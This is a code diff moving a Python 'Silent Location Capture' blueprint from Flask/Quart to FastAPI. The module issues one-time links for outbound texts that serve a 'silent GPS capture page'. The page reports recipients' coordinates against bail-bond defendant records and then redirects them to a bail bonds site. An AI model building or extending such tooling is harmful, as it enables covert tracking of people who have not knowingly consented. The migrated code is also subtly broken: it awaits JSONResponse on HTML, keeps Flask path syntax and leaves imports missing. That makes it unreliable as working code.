@@ -1,3 +1,4 @@
+from fastapi import APIRouter, Request
 """
 Geo-Link Blueprint — Silent Location Capture
 Generates one-time tracking tokens embedded in outbound texts.
@@ -36,10 +37,10 @@ def _get_public_url() -> str:
 _REDIRECT_AFTER = os.getenv("GEO_REDIRECT_URL", "https://www.shamrockbailbonds.biz")
 _TOKEN_TTL_HOURS = int(os.getenv("GEO_TOKEN_TTL_HOURS", "72"))
 
-@geo_bp.route("/geo/link", methods=["POST"])
-async def geo_create_link():
+@geo_bp.post("/geo/link")
+async def geo_create_link(request: Request):
     geo_pings = get_collection("geo_pings")
-    data = await request.get_json(force=True) or {}
+    data = await request.json() or {}
 
     token = secrets.token_urlsafe(12)
     expires_at = datetime.now(timezone.utc) + timedelta(hours=_TOKEN_TTL_HOURS)
@@ -62,9 +63,9 @@ async def geo_create_link():
 
     public_url = _get_public_url()
     short_url = f"{public_url}/g/{token}" if public_url else f"/g/{token}"
-    return jsonify({"token": token, "url": short_url})
+    return {"token": token, "url": short_url}
 
-@geo_bp.route("/g/<token>", methods=["GET"])
+@geo_bp.get("/g/<token>")
 async def geo_capture_page(token: str):
     """
     Serve the silent GPS capture page.
@@ -142,17 +143,17 @@ async def geo_capture_page(token: str):
 </script>
 </body>
 </html>"""
-    resp = await make_response(html)
+    resp = await JSONResponse(html)
     resp.headers["Content-Type"] = "text/html; charset=utf-8"
     resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
     return resp
 
-@geo_bp.route("/g/<token>/ping", methods=["POST"])
-async def geo_receive_ping(token: str):
+@geo_bp.post("/g/<token>/ping")
+async def geo_receive_ping(request: Request, token: str):
     geo_pings = get_collection("geo_pings")
     active_bonds = get_collection("active_bonds")
 
-    data = await request.get_json(force=True) or {}
+    data = await request.json() or {}
     lat = data.get("lat")
     lng = data.get("lng")
     accuracy = data.get("accuracy")
@@ -192,7 +193,7 @@ async def geo_receive_ping(token: str):
     )
 
     if result.matched_count == 0:
-        return jsonify({"ok": False, "reason": "token_not_found_or_expired"}), 404
+        return JSONResponse({"ok": False, "reason": "token_not_found_or_expired"}, status_code=404)
 
     record = await geo_pings.find_one({"token": token}, {"booking_number": 1, "phone": 1, "defendant_name": 1})
     booking_number = record.get("booking_number") if record else None
@@ -258,9 +259,9 @@ async def geo_receive_ping(token: str):
             },
         )
 
-    return jsonify({"ok": True})
+    return {"ok": True}
 
-@geo_bp.route("/api/geo/pings/<booking_number>", methods=["GET"])
+@geo_bp.get("/api/geo/pings/<booking_number>")
 async def geo_get_pings(booking_number: str):
     geo_pings = get_collection("geo_pings")
     cursor = geo_pings.find(
@@ -270,4 +271,4 @@ async def geo_get_pings(booking_number: str):
     docs = []
     async for doc in cursor:
         docs.append(doc)
-    return jsonify({"pings": docs, "count": len(docs)})
+    return {"pings": docs, "count": len(docs)}
